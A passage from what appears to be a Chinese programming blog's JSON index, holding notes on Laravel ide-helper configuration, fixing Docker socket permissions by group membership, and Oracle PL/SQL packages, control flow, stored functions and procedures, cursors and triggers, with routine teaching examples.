123php artisan ide-helper:models#这时会出现询问：Do you want to overwrite the existing model files? Choose no to write to _ide_helper_models.php instead? (Yes&#x2F;No): (yes&#x2F;no) [no]: **注:**输入 yes 则会直接在模型文件中写入注释，否则会生成「_ide_helper_models.php」文件。建议选择 yes，这样在跟踪文件的时候不会跳转到「_ide_helper_models.php」文件，不过这么做最好对模型文件做个备份，至少在生成注释之前用 git 控制一下版本，以防万一。 提示： 为模型生成字段信息必须在数据库中存在相应的数据表，不要生成 migration 还没运行 migrate 的时候就生成注释，这样是得不到字段信息的。 自动为链式操作注释这是什么意思呢？举个例子，在 migration 文件中经常可以看见这样的代码： 1$table-&gt;string(&#39;email&#39;)-&gt;unique(); 这时就算调用过了 php artisan ide-helper:generate，在调用像 -&gt;unique() 这样的链式操作的时候也无法实现代码提示. 需要将配置文件(ide-help.php,可以使用phpstorm的Find-&gt;Find in path 查找 include_fluent)&#39;include_fluent&#39; =&gt; false 修改为 &#39;include_fluent&#39; =&gt; true， 重新运行 php artisan ide-helper:generate。 生成 .phpStorm.meta.php可以生成一个.phpStorm.meta.php文件去支持工厂模式. 对于 Laravel, 这意味着我们可以让 PhpStorm 理解我们从 IoC 容器中解决了什么类型的对象。例如：事件将返回一个「Illuminate\\Events\\Dispatcher」对象，利用 meta 文件您可以调用 app(&#39;events&#39;) 并且它将自动完成 Dispatcher 的方法。 12345678app(&#39;events&#39;)-&gt;fire();\\App::make(&#39;events&#39;)-&gt;fire();&#x2F;** @var \\Illuminate\\Foundation\\Application $app *&#x2F;$app-&gt;make(&#39;events&#39;)-&gt;fire();&#x2F;&#x2F; When the key is not found, it uses the argument as class nameapp(&#39;App\\SomeClass&#39;); **提示:**可能需要重启 Phpstorm 使 .phpStorm.meta.php 文件生效。 自动运行 generate想在依赖包更新是自动更新注释，可以在 composer.json 文件中做如下配置： 1234567&quot;scripts&quot;:&#123; &quot;post-update-cmd&quot;: [ &quot;Illuminate\\\\Foundation\\\\ComposerScripts::postUpdate&quot;, &quot;php artisan ide-helper:generate&quot;, &quot;php artisan ide-helper:meta&quot; ]&#125; 代码提示当想提示views文件,models文件时可以使用默认快捷键ctrl+space **注:**但可能会被切换输入法等占用,所以可以更改输入法快捷键或者phpstorm中的快捷键 修改phpstorm中的快捷键方法在file-&gt;settings-&gt;keymap中搜索completion,修改冲突快捷键","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"php","slug":"php","permalink":"https://yanmymickey.github.io/tags/php/"},{"name":"laravel","slug":"laravel","permalink":"https://yanmymickey.github.io/tags/laravel/"}]},{"title":"docker命令使用权限问题","date":"2020-01-06T16:00:00.000Z","path":"2020/01/07/Note/docker权限问题/","text":"docker命令使用权限问题报错1ERROR: Got permission denied while trying to connect to the Docker daemon socket...... 解决:权限问题,当前用户没有运行docker的权限 建议解决办法将当前用户加入docker用户组 12345678910test@ubuntu~$whoami testtest@ubuntu~$sudo groupadd dockertest@ubuntu~$sudo usermod test -aG docker #物理机需要注销登录,重新登录#终端连接需退出登录,重新登录#重新登录后运行下面命令test@ubuntu~$groupstest ....... docker#出现docker,再运行docker命令,不会再对权限报错 不推荐解决办法1将&#x2F;var&#x2F;run&#x2F;docker.socket文件权限增加","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"docker","slug":"docker","permalink":"https://yanmymickey.github.io/tags/docker/"}]},{"title":"plsql包","date":"2019-12-16T16:00:00.000Z","path":"2019/12/17/Oracle/plsql包/","text":"plsql包介绍 包是一组相关过程、函数、变量、常量和游标等PL/SQL程序设计元素的组合，它具有面向对象程序设计语言的特点，是对这些PL/SQL 程序设计元素的封装。 包类似于C++和JAVA语言中的类 其中变量相当于类中的成员变量，过程和函数相当于类方法。 把相关的模块归类成为包，可使开发人员利用面向对象的方法进行存储过程的开发，从而提高系统性能。 与类相同，包中的程序元素也分为公用元素和私用元素两种，这两种元素的区别是他们允许访问的程序范围不同，即它们的作用域不同。 公用元素不仅可以被包中的函数、过程所调用，也可以被包外的PL/SQL程序访问， 私有元素只能被包内的函数和过程序所访问。 在PL/SQL程序设计中，使用包不仅可以使程序设计模块化，对外隐藏包内所使用的信息（通过使用私用变量），而且可以提高程序的执行效率。 因为，当程序首次调用包内函数或过程时，ORACLE将整个包调入内存，当再次访问包内元素时，ORACLE直接从内存中读取，而不需要进行磁盘I/O操作，从而使程序执行效率得到提高 组成 一个包由两个分开的部分组成 包定义 （PACKAGE） 包定义部分声明包内数据类型、变量、常量、游标、子程序和异常错误处理等元素。 这些元素为包的公有元素。 包主体 （PACKAGE BODY） 包主体则是包定义部分的具体实现，它定义了包定义部分所声明的游标和子程序。 包主体中可以声明包的私有元素。 注： 包定义和包主体分开编译，并作为两部分分开的对象存放在数据库字典中。 包定义语法1234567CREATE [OR REPLACE] PACKAGE package_name &#123;IS | AS&#125; [公有数据类型定义[公有数据类型定义]…] [公有游标声明[公有游标声明]…] [公有变量、常量声明[公有变量、常量声明]…] [公有子程序声明[公有子程序声明]…] END [package_name]; 注： 在Oracle的存储过程和函数中，其实IS和AS是同义词。 还有在自定义类型（TPYE）和包（PACKAGE）时，使用IS和AS也并没有什么区别。 但是在创建视图（VIEW）时，只能使用AS而不能使用IS。 在声明游标（CURSOR）时，只能使用IS而不能使用AS。 包主体语法12345678910CREATE [OR REPLACE] PACKAGE BODY package_name &#123;IS | AS&#125; [私有数据类型定义[私有数据类型定义]…] [私有变量、常量声明[私有变量、常量声明]…] [私有子程序声明和定义[私有子程序声明和定义]…] [公有游标定义[公有游标定义]…] [公有子程序定义[公有子程序定义]…] [BEGIN PL&#x2F;SQL 语句] END [package_name]; 注： 在包主体定义公有程序时，它们必须与包定义中所声明子程序的格式完全一致 创建包应用举例123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&#x2F;*例1:创建的包为demo_pack。 对dept表进行插入、查询和修改操作，并通过demo_pack包中的记录变量DeptRec 显示所查询到的数据库信息。 该包中包含一个记录类型变量DeptRec、两个函数和一个过程。： *&#x2F;CREATE OR REPLACE PACKAGE demo_pack IS DeptRec dept%ROWTYPE; FUNCTION add_dept(dept_no NUMBER, dept_name VARCHAR2, location VARCHAR2) RETURN NUMBER; FUNCTION remove_dept(dept_no NUMBER) RETURN NUMBER; PROCEDURE query_dept(dept_no IN NUMBER); END demo_pack; --包主体部分：CREATE OR REPLACE PACKAGE BODY demo_pack IS FUNCTION add_dept(dept_no NUMBER, dept_name VARCHAR2, location VARCHAR2) RETURN NUMBER IS empno_remaining EXCEPTION; PRAGMA EXCEPTION_INIT(empno_remaining, -1); &#x2F;* -1 本身是违反唯一约束条件的错误代码，为已预定义DUP_VAL_ON_INDEX *&#x2F; BEGIN INSERT INTO dept VALUES(dept_no, dept_name, location); IF SQL%FOUND THEN RETURN 1; END IF; EXCEPTION WHEN empno_remaining THEN RETURN 0; WHEN OTHERS THEN RETURN -1; END add_dept; FUNCTION remove_dept(dept_no NUMBER) RETURN NUMBER IS BEGIN DELETE FROM dept WHERE deptno&#x3D;dept_no; IF SQL%FOUND THEN RETURN 1; ELSE RETURN 0; END IF; EXCEPTION WHEN OTHERS THEN RETURN -1; END remove_dept; PROCEDURE query_dept (dept_no IN NUMBER) IS BEGIN SELECT * INTO DeptRec FROM dept WHERE deptno&#x3D;dept_no; EXCEPTION WHEN NO_DATA_FOUND THEN DBMS_OUTPUT.PUT_LINE(&#39;数据库中没有编码为&#39;||dept_no||&#39;的部门&#39;); WHEN TOO_MANY_ROWS THEN DBMS_OUTPUT.PUT_LINE(&#39;程序运行错误!请使用游标&#39;); WHEN OTHERS THEN DBMS_OUTPUT.PUT_LINE(SQLCODE||&#39;----&#39;||SQLERRM); END query_dept; END demo_pack; 调用包应用举例1234567891011121314151617181920212223DECLARE Var NUMBER; BEGIN Var :&#x3D; demo_pack.add_dept(90,&#39;Administration&#39;, &#39;Beijing&#39;); IF var &#x3D;-1 THEN DBMS_OUTPUT.PUT_LINE(SQLCODE||&#39;----&#39;||SQLERRM); ELSIF var &#x3D;0 THEN DBMS_OUTPUT.PUT_LINE(&#39;该部门记录已经存在！&#39;); ELSE DBMS_OUTPUT.PUT_LINE(&#39;添加记录成功！&#39;); Demo_pack.query_dept(90); DBMS_OUTPUT.PUT_LINE(demo_pack.DeptRec.deptno||&#39;---&#39;|| demo_pack.DeptRec.dname||&#39;---&#39;||demo_pack.DeptRec.loc); var :&#x3D; demo_pack.remove_dept(90); IF var &#x3D;-1 THEN DBMS_OUTPUT.PUT_LINE(SQLCODE||&#39;----&#39;||SQLERRM); ELSIF var&#x3D;0 THEN DBMS_OUTPUT.PUT_LINE(&#39;该部门记录不存在！&#39;); ELSE DBMS_OUTPUT.PUT_LINE(&#39;删除记录成功！&#39;); END IF; END IF; END; 包的开发步骤 将每个存储过程调试正确 用文本编辑软件将各个存储过程和函数集成在一起 按照包的定义要求将集成的文本的前面加上包定义 按照包的定义要求将集成的文本的前面加上包定义 使用开发工具进行调式 子程序重载PL/SQL 允许对包内子程序和本地子程序进行重载。所谓重载时指两个或多个子程序有相同的名称，但拥有不同的参数变量 参数变量、参数顺序 参数顺序或参数数据类型 参数数据类型 123456789101112131415161718192021222324252627282930313233343536--例子--包定义CREATE OR REPLACE PACKAGE demo_pack1 IS DeptRec dept%ROWTYPE; FUNCTION query_dept(dept_no IN NUMBER) RETURN INTEGER; FUNCTION query_dept(dept_no IN VARCHAR2) RETURN INTEGER; END demo_pack1;--包主体CREATE OR REPLACE PACKAGE BODY demo_pack1 IS FUNCTION query_dept(dept_no IN NUMBER) RETURN INTEGER IS BEGIN IF dept_no &#x3D;10 THEN SELECT * INTO DeptRec FROM dept WHERE deptno&#x3D;dept_no; RETURN 1; ELSE RETURN 0; END IF; END query_dept; FUNCTION query_dept(dept_no IN VARCHAR2) RETURN INTEGER IS BEGIN IF dept_no &#x3D;10 THEN SELECT * INTO DeptRec FROM dept WHERE deptno&#x3D;dept_no; RETURN 1; ELSE RETURN 0; END IF; END query_dept; END demo_pack1; 注： 如果两个子程序的参数只是名称和方式不同时，不能重载他们。 PROCEDURE OverlodeMe（P_parameter in number） PROCEDURE OverlodeMe（P_parameter out number） PROCEDURE OverlodeMe（P_parameter number）PROCEDURE OverlodeMe（P_para number） 不能只根据两个函数的返回类型进行重载 FUNCTION Overlodeme RETURN dateFUNCTION Overlodeme RETURN boolean 重载函数的参数必须在类型系列方面有所不同，既不能再同一类 型系列上重载：即字符、数值、日期等等 PROCEDURE OverlodeMe（P_parameter in char）PROCEDURE OverlodeMe（P_parameter out varchar2(10)） 删除包语法1234DROP PACKAGE [BODY] [user.]package_name --例：DROP PACKAGE emp_package; 包所涉及到的数据字典视图： DBA_SOURCE USER_SOURCE USER_ERRORS DBA_OBJECTS","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"oracle","slug":"oracle","permalink":"https://yanmymickey.github.io/tags/oracle/"}]},{"title":"PL/SQL基本语法","date":"2019-12-16T16:00:00.000Z","path":"2019/12/17/Oracle/plsql基本语法/","text":"PL/SQL基本语法增删改查在SQLPLUS中不论是SQL还是PL/SQL，对数据表的改动。最后都需要commit; 完成实例与数据文件的交互。 流程控制条件语句:IF语句,CASE语句IF语句的基本形式为 ：123456789IF &lt;布尔表达式&gt; THEN PL&#x2F;SQL和 SQL语句 END IF; 或 IF &lt;布尔表达式&gt; THEN PL&#x2F;SQL 和 SQL语句 ELSE PL其它语句 END IF; 注:&lt;布尔表达式&gt;最后返回TRUE or FALSE or NULL仅当为TRUE时执行THEN后面的语句。 判断 结果 NULL AND TRUE NULL NULL AND FALSE FALSE NULL AND NULL NULL NULL OR TRUE TRUE NULL OR FALSE NULL NULL OR NULL NULL NVL函数**NVL(E1, E2)**如果E1为NULL，则函数返回E2，否则返回E1本身。 **NVL2(E1, E2, E3)**如果E1为NULL，则函数返回E3，若E1不为null，则返回E2。 CASE语句的基本形式为 ：123456CASE selector WHEN expression1 THEN result1 WHEN expression2 THEN result2 WHEN expressionN THEN resultN [ ELSE resultN+1] END; 循环语句:LOOP语句,EXIT语句简单循环语句的一般形式：1234LOOP 要执行的语句; EXIT WHEN &lt;条件语句&gt; &#x2F;*条件满足，退出循环语句*&#x2F; END LOOP; 注：EXIT WHEN 子句是必须的，否则循环将无法停止。 WHILE 循环语句的一般形式：123WHILE &lt;布尔表达式&gt; LOOP 要执行的语句; END LOOP; 注： while循环语句执行的顺序是先判断&lt;布尔表达式&gt;的真假，如果为真则循环执行，否则退出循环。 在WHILE循环语句中仍然可以使用EXIT或EXIT WHEN子句 FOR循环语句的一般形式：123FOR 循环计数器 IN [ REVERSE ] 下限 .. 上限 LOOP 要执行的语句; END LOOP; 注： 每循环一次，循环变量自动加1；使用关键字REVERSE，循环变量自动减1 跟在IN REVERSE 后面的数字必须是从小到大的顺序，但不一定是整数，可以是能够转换成整数的变量或表达式 可以使用EXIT或者EXIT WHEN子句退出循环 RETURN、EXIT、CONTINUE语句RETURN：直接跳出块、存储过程或者函数 EXIT：跳出本循环转而执行本循环的上一级循环的下一次循环。 CONTIUNE：本次循环后面的代码部分不再执行，转而执行本循环的下一次循环。 顺序语句:GOTO语句,NULL语句GOTO语句的一般形式：1234GOTO label; . . . . . . &lt;&lt;label&gt;&gt; &#x2F;*标号是用&lt;&lt; &gt;&gt;括起来的标识符 *&#x2F; 注：GOTO语句是无条件跳转到指定的标号去的意思 示例： 12345678910111213DECLARE V_counter NUMBER :&#x3D; 1; BEGIN LOOP DBMS_OUTPUT.PUT_LINE(&#39;V_counter的当前值为:&#39;||V_counter); V_counter :&#x3D; v_counter + 1; IF v_counter &gt; 10 THEN GOTO l_ENDofLOOP; END IF; END LOOP; &lt;&lt;l_ENDofLOOP&gt;&gt; DBMS_OUTPUT.PUT_LINE(&#39;V_counter的当前值为:&#39;||V_counter); END ; NULL语句：在PL/SQL 程序中，可以用 null 语句来说明“不用做任何事情”的意思，相当于一个占位符，可以使某些语句变得有意义，提高程序的可读性 示例： 1234567891011DECLARE . . . BEGIN . . . IF v_num IS NULL THEN GOTO print1; END IF; . . . &lt;&lt;print1&gt;&gt; NULL;-- 不需要处理任何数据。 END;","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"oracle","slug":"oracle","permalink":"https://yanmymickey.github.io/tags/oracle/"}]},{"title":"plsql存储函数和过程","date":"2019-12-16T16:00:00.000Z","path":"2019/12/17/Oracle/plsql存储函数和过程/","text":"plsql存储函数和过程定义 ORACLE 提供可以把PL/SQL 程序存储在数据库中，并可以在任何地方来运行它（写好的存储函数和过程就同Oracle原有的函数一样）。这样就叫存储过程或函数。 过程和函数统称为PL/SQL子程序，他们是被命名的PL/SQL块，均存储在数据库中，并通过输入、输出参数或输入/输出参数与其调用者交换信息。 过程和函数的唯一区别是函数总向调用者返回数据，而过程则不返回数据。 存储函数 创建存储函数语法：123456789101112CREATE [OR REPLACE] FUNCTION function_name [ (argment [ &#123; IN | OUT | IN OUT &#125; ] Type ， argment [ &#123; IN | OUT | IN OUT &#125; ] Type ] RETURN return_type &#123; IS | AS &#125; &lt;类型.变量的说明&gt; BEGIN FUNCTION_body EXCEPTION 其它语句 END; --注： OR REPLACE有无的区别。 示例1234567891011121314151617--例：获取某部门员工数和工资总和 CREATE OR REPLACE FUNCTION get_salary( Dept_no NUMBER, Emp_count OUT NUMBER) RETURN NUMBER IS V_sum NUMBER;BEGIN SELECT SUM(sal), count(*) INTO V_sum, emp_count FROM emp WHERE deptno&#x3D;dept_no; --emp表中dept_no是唯一Key RETURN v_sum; EXCEPTION WHEN NO_DATA_FOUND THEN DBMS_OUTPUT.PUT_LINE(&#39;你需要的数据不存在!&#39;); WHEN OTHERS THEN DBMS_OUTPUT.PUT_LINE(SQLCODE||&#39;---&#39;||SQLERRM); END get_salary; 调用函数方法 函数声明时所定义的参数称为形式参数，应用程序调用时为函数传递的参数称为实际参数。 应用程序在调用函数时，可以使用以下三种方法向函数传递参数： 位置表示法格式1argument_value1[,argument_value2 …] 注：类型序列必须与函数声明是的类型序列相同 示例12345678--例：计算某部门的员工数和工资总和 DECLARE V_num NUMBER; V_sum NUMBER; BEGIN V_sum :&#x3D;get_salary(30, v_num); DBMS_OUTPUT.PUT_LINE(&#39;30号部门工资总和：&#39;||v_sum||&#39;，人数：&#39;||v_num); END; 名称表示法格式1argument &#x3D;&gt; parameter [,…] 注： argument 为形式参数，它必须与函数定义时所声明的形式参数名称以及类型相同。Parameter 为实际参数。 在这种格式中，形式参数与实际参数成对出现，相互间关系唯一确定，所以参数的顺序可以任意排列。 示例12345678例：计算某部门的员工数和工资总和 DECLARE V_num NUMBER; V_sum NUMBER; BEGIN V_sum :&#x3D;get_salary(emp_count &#x3D;&gt; v_num, dept_no &#x3D;&gt; 30); DBMS_OUTPUT.PUT_LINE(&#39;30号部门工资总和：&#39;||v_sum||&#39;，人数：&#39;||v_num); END; 混合表示法 即在调用一个函数时，同时使用位置表示法和名称表示法为函数传递参数。 采用这种参数传递方法时，使用位置表示法所传递的参数必须放在名称表示法所传递的参数前面。 也就是说，无论函数具有多少个参数，只要其中有一个参数使用名称表示法，其后所有的参数都必须使用名称表示法。 示例1234567891011--例： DECLARE Var VARCHAR2(32); BEGIN Var :&#x3D; demo_fun(&#39;user1&#39;, 30, sex &#x3D;&gt; &#39;男&#39;); DBMS_OUTPUT.PUT_LINE(var); Var :&#x3D; demo_fun(&#39;user2&#39;, age &#x3D;&gt; 40, sex &#x3D;&gt; &#39;男&#39;); DBMS_OUTPUT.PUT_LINE(var); Var :&#x3D; demo_fun(&#39;user3&#39;, sex &#x3D;&gt; &#39;女&#39;, age &#x3D;&gt; 20); DBMS_OUTPUT.PUT_LINE(var); END; 参数默认值在CREATE OR REPLACE FUNCTION 语句中声明函数参数时可以使用DEFAULT关键字为输入参数指定默认值。 1234567891011--定义示例： CREATE OR REPLACE FUNCTION demo_fun( Name VARCHAR2,Age INTEGER, Sex VARCHAR2 DEFAULT &#39;男&#39;) RETURN VARCHAR2 IS V_var VARCHAR2(32); BEGIN V_var :&#x3D; name||&#39;：&#39;||TO_CHAR(age)||&#39;岁，&#39;||sex; RETURN v_var; END; 注： 具有默认值的函数创建后，在函数调用时，如果没有为具有默认值的参数提供实际参数值，函数将使用该参数的默认值。 但当调用者为默认参数提供实际参数时，函数将使用实际参数值。 在创建函数时，只能为输入参数设置默认值，而不能为输入/输出参数设置默认值。 1234567891011--调用示例： DECLARE Var VARCHAR(32); BEGIN Var :&#x3D; demo_fun(&#39;user1&#39;, 30); DBMS_OUTPUT.PUT_LINE(var); Var :&#x3D; demo_fun(&#39;user2&#39;, age &#x3D;&gt; 40); DBMS_OUTPUT.PUT_LINE(var); Var :&#x3D; demo_fun(&#39;user3&#39;, sex &#x3D;&gt; &#39;女&#39;, age &#x3D;&gt; 20); DBMS_OUTPUT.PUT_LINE(var); END; 存储过程创建存储过程语法12345678910CREATE [OR REPLACE] PROCEDURE Procedure_name [ (argment [ &#123; IN | OUT | IN OUT &#125; ] Type, argment [ &#123; IN | OUT | IN OUT &#125; ] Type ] &#123; IS | AS &#125; &lt;类型.变量的说明&gt; BEGIN &lt;执行部分&gt; EXCEPTION &lt;可选的异常错误处理程序&gt; END; 示例1234567891011121314151617--例 ：删除指定员工记录 CREATE OR REPLACE PROCEDURE DelEmp (v_empno IN emp.empno%TYPE) AS No_result EXCEPTION; BEGIN DELETE FROM emp WHERE empno&#x3D;v_empno; IF SQL%NOTFOUND THEN RAISE no_result; END IF; DBMS_OUTPUT.PUT_LINE(&#39;编码为&#39;||v_empno||&#39;的员工已被除名!&#39;); EXCEPTION WHEN no_result THEN DBMS_OUTPUT.PUT_LINE(&#39;你需要的数据不存在!&#39;); WHEN OTHERS THEN DBMS_OUTPUT.PUT_LINE(SQLCODE||&#39;---&#39;||SQLERRM); END DelEmp; 调用存储过程存储过程建立完成后，只要通过授权，用户就可以在SQLPLUS 、ORACLE开发工具或第三方开发工具中来调用运行。ORACLE 使用EXECUTE 语句来实现对存储过程的调用 语法1EXEC[UTE] Procedure_name( parameter1, parameter2…) 示例123456789101112131415161718192021222324252627282930--sqlplus调用示例SQL&gt; EXECUTE DelEmp(10)； SQL&gt; EXECUTE DelEmp(:a)； SQL&gt; variable a varchar2(20) SQL&gt; execute :a:&#x3D;fun_stu(&#39;BA&#39;);--例：计算指定部门的工资总和，并统计其中的职工数量。 --创建存储过程CREATE OR REPLACE PROCEDURE proc_demo (Dept_no NUMBER DEFAULT 10 , Sal_sum OUT NUMBER, Emp_count OUT NUMBER) IS BEGIN SELECT SUM(sal), COUNT(*) INTO sal_sum, emp_count FROM emp WHERE deptno&#x3D;dept_no; EXCEPTION WHEN NO_DATA_FOUND THEN DBMS_OUTPUT.PUT_LINE(&#39;你需要的数据不存在!&#39;); WHEN OTHERS THEN DBMS_OUTPUT.PUT_LINE(SQLCODE||&#39;---&#39;||SQLERRM); END proc_demo;--调用存储过程: DECLARE V_num NUMBER; V_sum NUMBER(8, 2); BEGIN Proc_demo(30, v_sum, v_num); DBMS_OUTPUT.PUT_LINE(&#39;30号部门工资总和：&#39;||v_sum||&#39;，人数：&#39;||v_num); Proc_demo(sal_sum &#x3D;&gt; v_sum, emp_count &#x3D;&gt; v_num); DBMS_OUTPUT.PUT_LINE(&#39;10号部门工资总和：&#39;||v_sum||&#39;，人数：&#39;||v_num); END; 查询、删除过程和函数 在SQL*PLUS 中，可以用DESCRIBE 命令查看过程的名字及其参数 DESCRIBE Procedure_name;(desc table; 用于列出指定表或视图中的所有列) 可以使用DROP语句删除函数和过程： 1234--删除函数DROP FUNCTION function_name;--删除过程DROP PROCEDURE proceduer_name; 授权执行权给相关的用户或角色 如果调式正确的存储过程没有进行授权，那就只有建立者本人才可以运行。所以作为应用系统的一部分的存储过程也必须进行授权才能达到要求。 可以用GRANT命令来进行存储过程的运行授权 语法123--例GRANT EXECUTE ON Proc_demo TO user| role | PUBLIC [WITH GRANT OPTION] 与过程相关的内置数据字典 名称 描述 USER_PROCEDURES 查询用户所有的子程序信息 USER_SOURCE 查看用户所有对象的源代码 USER_OBJECTS 查看用户创建的过程对象 USER_ERRORS 查看用户所有的子程序错误信息 123456789SELECT object_name,authid,object_type FROM user_procedures;--AUTHID DEFINER （定义者权限）：指编译存储对象的所有者。也是默认权限模式 --AUTHID CURRENT_USER（调用者权限）：指拥有当前会话权限的模式 SELECT * FROM user_source WHERE name&#x3D;&#39;MLDN_PROC&#39; ;SELECT object_name,created,timestamp,status FROM user_objects WHERE object_type&#x3D;&#39;PROCEDURE&#39; OR object_type&#x3D;&#39;FUNCTION&#39;; --status：该字段有两个取值：VALID（有效），INVALID（无效）","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"oracle","slug":"oracle","permalink":"https://yanmymickey.github.io/tags/oracle/"}]},{"title":"plsql游标","date":"2019-12-16T16:00:00.000Z","path":"2019/12/17/Oracle/plsql游标/","text":"plsql游标游标 SQL语句 非查询语句 隐式的 结果是单行的查询语句 隐式或显示的 结果是多行的查询语句 显示的 显示游标定义游标：就是定义一个游标名，以及与其相对应的SELECT 语句 1CURSOR cursor_name IS select_statement; 注： 游标声明部分是唯一可以出现在模块声明部分的步骤，其他三个步骤都在执行或异常处理部分中 游标名是标识符，所以也有作用域，并且必须在使用前进行说明 任何SELECT语句都是合法的，但是SELECT …INTO语句是非法的 在声明部分的末尾声明游标 打开游标：就是执行游标所对应的SELECT语句，将其查询结果放入工作区，并且指针指向工作区的首部，标识游标结果集合。 1OPEN cursor_name 注：PL/SQL 程序不能用OPEN 语句重复打开同一个游标 提取游标：就是检索结果集合中的数据行，放入指定的输出变量中。 1FETCH cursor_name INTO &#123;variable_list | record_variable &#125;; 关闭游标：当提取和处理完游标结果集合数据后，应及时关闭游标，以释放该游标所占用的系统资源，并使该游标的工作区变成无效，不能再使用FETCH 语句取其中数据。关闭后的游标可以使用OPEN 语句重新打开。 1CLOSE cursor_name; 游标属性 属性 描述 %FOUND 布尔型属性，当最近一次读记录时成功返回,则值为TRUE %NOTFOUND 布尔型属性，与%FOUND相反 %ISOPEN 布尔型属性，当游标已打开时返回 TRUE %ROWCOUNT 数字型属性，返回已从游标中读取的记录数 隐式游标说明： 显式游标主要是用于对查询语句的处理，尤其是在查询结果为多条记录的情况下；而对于非查询语句，如修改、删除操作，则由ORACLE 系统自动地为这些操作设置游标并创建其工作区，这些由系统隐含创建的游标称为隐式游标 隐式游标的名字为SQL，这是由ORACLE 系统定义的。对于隐式游标的操作，如定义、打开、取值及关闭操作，都由ORACLE 系统自动地完成，无需用户进行处理。用户只能通过隐式游标的相关属性，来完成相应的操作。 在隐式游标的工作区中，所存放的数据是最新处理的一条SQL 语句所包含的数据（与用户自定义的显示游标无关的）。 INSERT, UPDATE, DELETE, SELECT INTO语句中不必明确定义游标 游标属性 属性 描述 %FOUND 布尔型属性,至少有一行被INSERT,DELETE或UPDATE时返回TRUE。 %NOTFOUND 布尔型属性，与%FOUND相反 %ISOPEN 布尔型属性，当游标已打开时返回 TRUE布尔型属性, 取值总是FALSE。SQL命令执行完毕立即关闭隐式游标。 %ROWCOUNT 数字型属性，返回已从游标中读取的记录数 注： 与最近的sql语句（update,insert,delete,select）发生交互，当最近的一条sql语句没有涉及任何行的时候，则返回相应的值。 例如要update一行数据时，如果没有找到，就可以作相应操作。 游标变量举例： 声明两个强类型定义游标变量和一个弱类型游标变量 1234567891011DECLARE TYPE deptrecord IS RECORD( Deptno dept.deptno%TYPE, Dname dept.deptno%TYPE, Loc dept.loc%TYPE ); TYPE deptcurtype IS REF CURSOR RETURN dept%ROWTYPE; TYPE deptcurtyp1 IS REF CURSOR RETURN deptrecord; TYPE curtype IS REF CURSOR; Dept_c1 deptcurtype; Dept_c2 deptcurtyp1; Cv curtype; 游标变量操作游标变量操作也包括打开、提取和关闭三个步骤 打开游标变量 ：打开游标变量时使用的是OPEN…FOR 语句。 格式为： 12OPEN &#123;cursor_variable_name | :host_cursor_variable_name&#125; FOR select_statement; 注： cursor_variable_name为游标变量 host_cursor_variable_name为PL/SQL主机环境（如OCI: ORACLE Call Interface，Pro*c 程序等）中声明的游标变量。 OPEN…FOR 语句可以在关闭当前的游标变量之前重新打开游标变量，而不会导致CURSOR_ALREAD_OPEN异常错误。 新打开游标变量时，前一个查询的内存处理区将被释放 提取游标变量数据 ：使用FETCH语句提取游标变量结果集合中的数据。格式为： 12FETCH &#123;cursor_variable_name | :host_cursor_variable_name&#125; INTO &#123;variable [, variable]…| record_variable&#125;; 注： 属性 含义 cursor_variable_name 游标变量名称 host_cursor_variable_name 宿主游标变量名称 variable 普通变量名称 record_variable 记录变量名称 关闭游标变量 ：CLOSE语句关闭游标变量，格式为： 1CLOSE &#123;cursor_variable_name | :host_cursor_variable_name&#125; 注： cursor_variable_name和host_cursor_variable_name分别为游标变量和宿主游标变量名称 如果应用程序试图关闭一个未打开的游标变量，则将导致INVALID_CURSOR异常错误。 游标类型 类型 说明 静态游标 显式游标和隐式游标称为静态游标，因为在使用他们之前，游标的定义已经完成，不能再更改。 动态游标 游标在声明时没有设定，在打开时可以对其进行修改。分为强类型游标和弱类型游标。 强类型动态游标 在声明变量时使用return关键字定义游标的返回类型 弱类型动态游标 在声明变量时不使用return关键字定义游标的返回类型 游标变量应用举例强类型参照游标变量类型12345678910111213141516171819DECLARE TYPE emp_job_rec IS RECORD( Employee_id emp.empno%TYPE, Employee_name emp.ename%TYPE, Job_title emp.job%TYPE); TYPE emp_job_refcur_type IS REF CURSOR RETURN emp_job_rec; Emp_refcur emp_job_refcur_type ; Emp_job emp_job_rec;BEGIN OPEN emp_refcur FOR SELECT empno, ename, job FROM emp ORDER BY deptno; FETCH emp_refcur INTO emp_job; WHILE emp_refcur%FOUND LOOP DBMS_OUTPUT.PUT_LINE(emp_job.employee_id||&#39;: &#39; ||emp_job.employee_name ||&#39; is a &#39; ||emp_job.job_title); FETCH emp_refcur INTO emp_job; END LOOP; END; 弱类型参照游标变量类型12345678DECLARE Type refcur_t IS REF CURSOR; Refcur refcur_t; TYPE sample_rec_type IS RECORD ( Id number, Description VARCHAR2 (30) ); sample sample_rec_type; selection varchar2(1) :&#x3D; UPPER (SUBSTR (&#39;&amp;tab&#39;, 1, 1));","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"oracle","slug":"oracle","permalink":"https://yanmymickey.github.io/tags/oracle/"}]},{"title":"plsql触发器","date":"2019-12-16T16:00:00.000Z","path":"2019/12/17/Oracle/plsql触发器/","text":"plsql触发器介绍 触发器在数据库里以独立的对象存储，它与存储过程不同的是， 存储过程通过其它程序来启动运行或直接启动运行 触发器是由一个事件来启动运行 触发器是当某个事件发生时自动地隐式运行。 触发器不能接收参数。 运行触发器就叫触发或点火（firing） ORACLE中事件指的是对数据库的表进行的INSERT、UPDATE及DELETE操作或对视图进行类似的操作。 ORACLE将触发器的功能扩展到了触发ORACLE，如数据库的启动与关闭等。 触发器类型 主要的触发器有三种： DML触发器 ORACLE可以在DML语句进行触发 可以在DML操作前或操作后进行触发 可以对每个行或语句操作上进行触发 替代触发器 由于在ORACLE里，不能直接对由两个以上的表建立的视图进行操作。所以给出了替代触发器。 它是ORACLE专门为进行视图操作的一种处理方法 系统（用户事件）触发器 它可以在ORACLE数据库系统的事件中进行触发 如ORACLE系统的启动与关闭等。 触发器组成 触发事件 即在何种情况下触发TRIGGER 例如：INSERT, UPDATE, DELETE 触发时间 即该TRIGGER 是在触发事件发生之前（BEFORE）还是之后(AFTER)触发 也就是触发事件和该TRIGGER 的操作顺序 